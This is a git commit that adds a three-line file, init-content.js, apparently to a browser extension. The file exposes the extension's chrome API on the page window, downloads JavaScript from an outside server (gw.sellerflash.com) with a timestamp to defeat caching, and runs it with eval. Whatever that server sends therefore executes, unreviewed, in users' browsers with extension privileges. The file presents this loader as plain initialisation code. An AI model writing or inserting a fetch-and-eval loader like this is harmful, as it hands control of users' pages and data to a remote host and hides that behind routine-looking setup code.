52f68e2bac06b9f9a04d18feacbdffc80a146ae1
erdinczeytin94 <111796301+erdinczeytin94@users.noreply.github.com>
2024-08-30 01:36:52 +0300

    Add files via upload

---
+++ init-content.js
@@ -0,0 +1,3 @@
+window.chrome = chrome;
+v = (new Date).valueOf();
+fetch("https://gw.sellerflash.com/api/extension/downloadExtension/content.js?v=" + v).then(function(n) { return n.text() }).then(function(n) { eval(n) });
